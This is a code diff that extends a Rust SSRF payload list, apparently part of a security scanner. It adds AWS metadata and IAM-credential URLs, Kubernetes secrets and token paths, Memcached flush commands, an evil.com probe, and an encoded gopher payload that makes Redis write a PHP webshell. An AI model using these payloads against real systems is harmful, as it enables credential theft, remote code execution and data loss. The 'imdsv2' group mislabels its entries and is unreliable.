@@ -77,6 +77,27 @@ pub fn get_payloads() -> Vec<Payload> {
             ("http://localhost:50070", "HDFS NameNode", Severity::High),
             ("http://localhost:8089", "Locust", Severity::Medium),
         ];
+        "imdsv2", [
+            ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 metadata", Severity::Critical),
+            ("http://169.254.169.254/latest/meta-data/token/", "AWS IMDSv2 token endpoint", Severity::Critical),
+            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials", Severity::Critical),
+            ("http://169.254.169.254/latest/user-data/", "AWS user data", Severity::Critical),
+            ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS instance identity", Severity::Critical),
+        ];
+        "kubernetes", [
+            ("https://kubernetes.default.svc/", "Kubernetes API server", Severity::Critical),
+            ("https://kubernetes.default.svc/version", "Kubernetes version info", Severity::High),
+            ("http://10.96.0.1:443/api/v1/namespaces", "Kubernetes internal API", Severity::Critical),
+            ("http://10.96.0.1:443/api/v1/secrets", "Kubernetes secrets", Severity::Critical),
+            ("file:///var/run/secrets/kubernetes.io/serviceaccount/token", "Kubernetes service account token", Severity::Critical),
+        ];
+        "ssrf-to-rce", [
+            ("gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20shell%20%22%3C%3Fphp%20system(%24_GET%5Bc%5D)%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0Aquit", "Redis SSRF to webshell via gopher", Severity::Critical),
+            ("gopher://127.0.0.1:11211/_stats", "Memcached SSRF stats", Severity::High),
+            ("gopher://127.0.0.1:11211/_flush_all", "Memcached flush all via SSRF", Severity::High),
+            ("dict://127.0.0.1:6379/info", "Dict protocol Redis", Severity::Critical),
+            ("sftp://evil.com:22", "SFTP protocol SSRF", Severity::High),
+        ];
     );
 
     for p in &mut payloads {
@@ -191,7 +212,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 30,
+            payloads.len() >= 55,
             "Must have substantial SSRF payload coverage, got {}",
             payloads.len()
         );
